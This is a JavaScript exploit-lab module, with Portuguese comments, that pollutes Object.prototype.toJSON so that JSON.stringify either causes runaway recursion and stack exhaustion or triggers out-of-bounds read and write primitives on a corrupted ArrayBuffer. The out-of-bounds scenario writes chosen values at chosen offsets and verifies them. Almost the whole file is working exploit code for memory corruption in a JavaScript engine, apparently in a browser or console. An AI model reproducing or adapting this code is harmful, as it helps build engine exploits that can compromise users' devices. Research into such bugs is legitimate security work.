// js/json_exploit_test.mjs
import { log as appLog, PAUSE_LAB, toHexS1 } from './utils.mjs';
import * as Core from './core_exploit.mjs';
import { AdvancedInt64 } from './int64.mjs';
import { OOB_CONFIG, updateOOBConfigFromUI } from './config.mjs';


const FNAME_BASE_JSON = "JsonExploitTest";

export async function runJsonRecursionTest(scenarioName) {
    const FNAME_RECURSION = `${FNAME_BASE_JSON}.runJsonRecursionTest[${scenarioName}]`;
    appLog(`--- Iniciando Teste de Recursão JSON: ${scenarioName} ---`, 'test', FNAME_RECURSION);
    updateOOBConfigFromUI();

    let testObject;
    let recursionCount = 0;
    const MAX_RECURSION_DEPTH_TEST = 5;

    const originalToJSON_Descriptor = Object.getOwnPropertyDescriptor(Object.prototype, "toJSON");
    let ppAppliedSuccessfully = false;

    try {
        Object.defineProperty(Object.prototype, "toJSON", {
            configurable: true,
            writable: true,
            value: function toJSON_DoS(...args) { // Não usar arrow function para 'this' dinâmico
                recursionCount++;
                const thisType = this && this.constructor ? this.constructor.name : typeof this;
                appLog(`toJSON_DoS invocado (${recursionCount}ª vez). this: ${thisType}`, 'info', `${FNAME_RECURSION}.toJSON_DoS`);

                if (recursionCount > MAX_RECURSION_DEPTH_TEST &&
                    scenarioName !== 'scenario_large_object_shallow' &&
                    scenarioName !== 'scenario_deep_object') {
                    appLog(`Limite de recursão do teste (${MAX_RECURSION_DEPTH_TEST}) atingido. Retornando.`, 'warn', `${FNAME_RECURSION}.toJSON_DoS`);
                    return { dos_recursion_limit_hit: true, count: recursionCount, final_this_type: thisType };
                }

                let keySuffix = "";
                if (scenarioName === 'scenario_recursive_keys_long') {
                    keySuffix = "_VERY_LONG_KEY_SUFFIX_".repeat(10);
                }

                switch (scenarioName) {
                    case 'scenario_poc_v23s_corrected':
                        if (this && typeof this === 'object' && !Array.isArray(this)) {
                            if (Object.keys(this).length > 0) {
                                const firstKey = Object.keys(this)[0];
                                try {
                                    return { [`processed_${firstKey}`]: JSON.parse(JSON.stringify(this[firstKey])) };
                                } catch (e_parse) {
                                     appLog(`Erro em JSON.parse(JSON.stringify(this[firstKey])) dentro do toJSON_DoS: ${e_parse.message}`, 'warn', `${FNAME_RECURSION}.toJSON_DoS`);
                                     return { error_in_poc_recursion: e_parse.message};
                                }
                            }
                        }
                        return Object.assign({}, this, { [`recursive_call_${recursionCount}${keySuffix}`]: "value" });

                    case 'scenario_recursive_keys_short':
                    case 'scenario_recursive_keys_long':
                        if (this && typeof this === 'object') {
                             try {
                                return { ...Object.keys(this).reduce((acc, key) => ({ ...acc, [`key_${key}${keySuffix}`]: `val_${key}` }), {}), recursive_depth: recursionCount };
                            } catch (e_keys) {
                                appLog(`Erro ao processar Object.keys no toJSON_DoS: ${e_keys.message}`, 'warn', `${FNAME_RECURSION}.toJSON_DoS`);
                                return { error_in_keys_scenario: e_keys.message, depth: recursionCount };
                            }
                        }
                        return { no_object_this: true, depth: recursionCount };

                    case 'scenario_large_object_shallow':
                        const largeObj = {};
                        for (let i = 0; i < 20000; i++) { largeObj[`key_${i}`] = i; }
                        return largeObj;

                    case 'scenario_deep_object':
                        let deepObj = {};
                        let current = deepObj;
                        for (let i = 0; i < 200; i++) { current.nested = {}; current = current.nested; }
                        return deepObj;
                    default:
                        appLog(`Cenário de recursão desconhecido: ${scenarioName}`, 'error', FNAME_RECURSION);
                        return { error: "unknown_scenario", scenario: scenarioName };
                }
            }
        });
        ppAppliedSuccessfully = true;
        appLog("Poluição Object.prototype.toJSON para Teste de DoS aplicada.", 'good', FNAME_RECURSION);

        if (scenarioName === 'scenario_poc_v23s_corrected') {
            testObject = { a: { b: { c: 123 } } };
        } else if (scenarioName.includes('keys')) {
            testObject = { prop1: "val1", prop2: "val2", prop3: "val3" };
        } else {
            testObject = { initial_trigger: true };
        }

        appLog(`Tentando JSON.stringify no objeto de teste...`, 'info', FNAME_RECURSION);
        await PAUSE_LAB(100);
        const resultJSON = JSON.stringify(testObject, null, 2);
        appLog(`JSON.stringify (Teste de DoS) CONCLUÍDO.`, 'good', FNAME_RECURSION);

        if (resultJSON && resultJSON.length < 2000) appLog(resultJSON, 'info', FNAME_RECURSION);
        else if (resultJSON) appLog(`(Resultado JSON Teste de DoS muito longo: ${resultJSON.length} chars)`, 'info', FNAME_RECURSION);
        else appLog("Resultado JSON foi nulo ou indefinido.", "warn", FNAME_RECURSION);

    } catch (e) {
        appLog(`Erro durante Teste de Recursão JSON (${scenarioName}): ${e.name} - ${e.message}`, 'error', FNAME_RECURSION);
        if (e.name === 'RangeError' && e.message.toLowerCase().includes('stack size exceeded')) {
            appLog("   SUCESSO (Controlado): Estouro de pilha detectado como esperado!", "vuln", FNAME_RECURSION);
        }
        console.error(`Erro Teste Recursão JSON (${scenarioName}):`, e);
    } finally {
        recursionCount = 0;
        if (ppAppliedSuccessfully) {
            if (originalToJSON_Descriptor) {
                Object.defineProperty(Object.prototype, "toJSON", originalToJSON_Descriptor);
                appLog("Object.prototype.toJSON restaurado.", 'info', `${FNAME_RECURSION}.Cleanup`);
            } else {
                delete Object.prototype.toJSON;
                appLog("Object.prototype.toJSON removido (não havia original).", 'info', `${FNAME_RECURSION}.Cleanup`);
            }
        }
    }
    appLog(`--- Teste de Recursão JSON: ${scenarioName} Concluído ---`, 'test', FNAME_RECURSION);
}

export async function jsonTriggeredOOBInteraction(targetTypeStr, relativeOffsetInt, valueToWriteHexStr, bytesToReadInt) {
    const FNAME_OOB_TRIGGER = `${FNAME_BASE_JSON}.jsonTriggeredOOBInteraction`;
    appLog(`--- Iniciando Cenário: JSON como Gatilho para Interação OOB ---`, 'test', FNAME_OOB_TRIGGER);
    updateOOBConfigFromUI();

    let objectToPassToJSON;
    let targetDescription;

    if (targetTypeStr === "new_array_buffer") {
        objectToPassToJSON = new ArrayBuffer(128);
        targetDescription = `Novo ArrayBuffer(${objectToPassToJSON.byteLength})`;
    } else if (targetTypeStr === "core_oob_buffer") {
        if (!Core.oob_array_buffer_real) {
            appLog("   AVISO: Core.oob_array_buffer_real não está ativo. Tentando ativar...", 'warn', FNAME_OOB_TRIGGER);
            await Core.triggerOOB_primitive();
            if (!Core.oob_array_buffer_real) {
                appLog("   ERRO: Falha ao ativar Core.oob_array_buffer_real. Abortando.", 'error', FNAME_OOB_TRIGGER);
                return;
            }
        }
        objectToPassToJSON = Core.oob_array_buffer_real;
        targetDescription = `Core.oob_array_buffer_real (${objectToPassToJSON.byteLength} bytes)`;
    } else {
        appLog(`   ERRO: Tipo de alvo desconhecido: ${targetTypeStr}`, 'error', FNAME_OOB_TRIGGER);
        return;
    }
    appLog(`   Alvo para JSON.stringify: ${targetDescription}`, 'info', FNAME_OOB_TRIGGER);

    let valueToWriteNum;
    if (valueToWriteHexStr && valueToWriteHexStr.toLowerCase().startsWith("0x")) {
        valueToWriteNum = parseInt(valueToWriteHexStr, 16);
    } else {
        valueToWriteNum = parseInt(valueToWriteHexStr, 10);
    }
    if (isNaN(valueToWriteNum)) {
        appLog(`   AVISO: Valor para escrita OOB '${valueToWriteHexStr}' inválido. Usando 0xDEADBEEF.`, 'warn', FNAME_OOB_TRIGGER);
        valueToWriteNum = 0xDEADBEEF;
    }

    appLog(`   Offset OOB Relativo: ${relativeOffsetInt} (${toHexS1(relativeOffsetInt)})`, 'info', FNAME_OOB_TRIGGER);
    appLog(`   Valor para Escrita OOB: ${toHexS1(valueToWriteNum)}`, 'info', FNAME_OOB_TRIGGER);
    appLog(`   Bytes para Leitura/Escrita OOB: ${bytesToReadInt}`, 'info', FNAME_OOB_TRIGGER);

    const originalToJSON_Descriptor = Object.getOwnPropertyDescriptor(Object.prototype, "toJSON");
    let ppAppliedSuccessfully = false;
    let resultJSON = null;
    let oobInteractionResult = { /* ... (como antes) ... */
        oob_trigger_executed: false, offset_tested: relativeOffsetInt, initial_val_read: "N/A",
        written_val_if_any: "N/A", read_back_val_after_write: "N/A", write_confirmed: false, error: null
    };
    
    // CORREÇÃO: Declarar ppKey aqui para estar acessível no finally
    const ppKey = "toJSON";

    try {
        if (!Core.oob_array_buffer_real) {
             appLog("   ERRO CRÍTICO: Primitiva OOB não está ativa. Abortando.", 'error', FNAME_OOB_TRIGGER);
            return;
        }

        Object.defineProperty(Object.prototype, ppKey, {
            configurable: true, writable: true,
            value: function toJSON_OOBTrigger() {
                if (this === objectToPassToJSON) {
                    appLog(`   toJSON_OOBTrigger: 'this' (${this?.constructor?.name}, Tam: ${this?.byteLength}) é o objeto alvo! Executando OOB...`, 'vuln', `${FNAME_OOB_TRIGGER}.${ppKey}`);
                    oobInteractionResult.oob_trigger_executed = true;
                    try {
                        const initial_val = Core.oob_read_relative(relativeOffsetInt, bytesToReadInt);
                        oobInteractionResult.initial_val_read = (initial_val instanceof AdvancedInt64) ? initial_val.toString(true) : toHexS1(initial_val, bytesToReadInt * 8);
                        appLog(`     toJSON_OOBTrigger - Valor OOB ${bytesToReadInt}-byte lido em offset ${relativeOffsetInt}: ${oobInteractionResult.initial_val_read}`, 'leak', `${FNAME_OOB_TRIGGER}.${ppKey}`);

                        appLog(`     toJSON_OOBTrigger - Escrevendo ${toHexS1(valueToWriteNum)} em offset ${relativeOffsetInt} (${bytesToReadInt} bytes)...`, 'vuln', `${FNAME_OOB_TRIGGER}.${ppKey}`);
                        // CORREÇÃO: Passar valueToWriteNum diretamente, oob_write_relative trata Int64 ou número
                        Core.oob_write_relative(relativeOffsetInt, valueToWriteNum, bytesToReadInt);
                        oobInteractionResult.written_val_if_any = toHexS1(valueToWriteNum, bytesToReadInt * 8); // Loga o valor completo que tentou escrever
                        appLog(`     toJSON_OOBTrigger - Escrita OOB realizada.`, 'good', `${FNAME_OOB_TRIGGER}.${ppKey}`);

                        const read_back_val = Core.oob_read_relative(relativeOffsetInt, bytesToReadInt);
                        oobInteractionResult.read_back_val_after_write = (read_back_val instanceof AdvancedInt64) ? read_back_val.toString(true) : toHexS1(read_back_val, bytesToReadInt * 8);
                        appLog(`     toJSON_OOBTrigger - Valor OOB lido em offset ${relativeOffsetInt} APÓS escrita: ${oobInteractionResult.read_back_val_after_write}`, 'leak', `${FNAME_OOB_TRIGGER}.${ppKey}`);

                        let written_val_for_compare;
                        let read_val_for_compare = read_back_val;

                        if (bytesToReadInt === 8) {
                            written_val_for_compare = (valueToWriteNum instanceof AdvancedInt64) ? valueToWriteNum : AdvancedInt64.fromNumber(valueToWriteNum);
                            oobInteractionResult.write_confirmed = read_back_val && read_back_val.equals(written_val_for_compare);
                        } else {
                            written_val_for_compare = valueToWriteNum;
                            if (bytesToReadInt === 1) {
                                written_val_for_compare &= 0xFF;
                                if (typeof read_val_for_compare === 'number') read_val_for_compare &= 0xFF;
                            } else if (bytesToReadInt === 2) {
                                written_val_for_compare &= 0xFFFF;
                                if (typeof read_val_for_compare === 'number') read_val_for_compare &= 0xFFFF;
                            }
                            // Para 4 bytes, a conversão para Uint32 em oob_read_relative já deve ser suficiente
                            oobInteractionResult.write_confirmed = (read_val_for_compare === written_val_for_compare);
                        }

                        if (oobInteractionResult.write_confirmed) {
                            appLog(`     toJSON_OOBTrigger - SUCESSO: Leitura após escrita OOB confirmou o valor!`, 'good', `${FNAME_OOB_TRIGGER}.${ppKey}`);
                        } else {
                            appLog(`     toJSON_OOBTrigger - FALHA: Lido ${toHexS1(read_val_for_compare, bytesToReadInt * 8)} não corresponde ao escrito ${toHexS1(written_val_for_compare, bytesToReadInt * 8)}.`, 'error', `${FNAME_OOB_TRIGGER}.${ppKey}`);
                        }
                    } catch (e_oob) {
                        appLog(`     toJSON_OOBTrigger - ERRO durante interação OOB: ${e_oob.message}`, 'error', `${FNAME_OOB_TRIGGER}.${ppKey}`);
                        oobInteractionResult.error = e_oob.message;
                        console.error("Erro na lógica OOB dentro de toJSON:", e_oob);
                    }
                    return oobInteractionResult;
                }
                if (originalToJSON_Descriptor && typeof originalToJSON_Descriptor.value === 'function') {
                    return originalToJSON_Descriptor.value.call(this);
                }
                return { processed_by_fallback_toJSON: true, this_type: typeof this, constructor_name: this?.constructor?.name };
            }
        });
        ppAppliedSuccessfully = true;
        appLog(`Poluição Object.prototype.${ppKey} para Gatilho OOB aplicada.`, 'good', FNAME_OOB_TRIGGER);

        appLog(`Tentando JSON.stringify em ${targetDescription}...`, 'info', FNAME_OOB_TRIGGER);
        await PAUSE_LAB(100);
        resultJSON = JSON.stringify(objectToPassToJSON, null, 2);
        
        appLog(`JSON.stringify (Gatilho OOB) CONCLUÍDO.`, 'good', FNAME_OOB_TRIGGER);
        if (resultJSON && resultJSON.length < 2000) appLog(resultJSON, 'info', FNAME_OOB_TRIGGER);
        else if (resultJSON) appLog(`(Resultado JSON Gatilho OOB muito longo: ${resultJSON.length} chars)`, 'info', FNAME_OOB_TRIGGER);
        else appLog("Resultado JSON foi nulo ou indefinido.", "warn", FNAME_OOB_TRIGGER);

    } catch (e) {
        oobInteractionResult.error = e.message; // Captura erro no resultado
        appLog(`Erro fatal durante Gatilho OOB via JSON: ${e.name} - ${e.message}`, 'error', FNAME_OOB_TRIGGER);
        console.error("Erro Gatilho OOB via JSON:", e);
    } finally {
        if (ppAppliedSuccessfully) { 
            if (originalToJSON_Descriptor) {
                Object.defineProperty(Object.prototype, ppKey, originalToJSON_Descriptor); // Usa ppKey
                appLog(`Object.prototype.${ppKey} restaurado.`, 'info', `${FNAME_OOB_TRIGGER}.Cleanup`);
            } else {
                delete Object.prototype[ppKey]; // Usa ppKey
                appLog(`Object.prototype.${ppKey} removido (não havia original).`, 'info', `${FNAME_OOB_TRIGGER}.Cleanup`);
            }
        }
    }
    appLog(`--- Cenário: JSON como Gatilho OOB Concluído ---`, 'test', FNAME_OOB_TRIGGER);
}
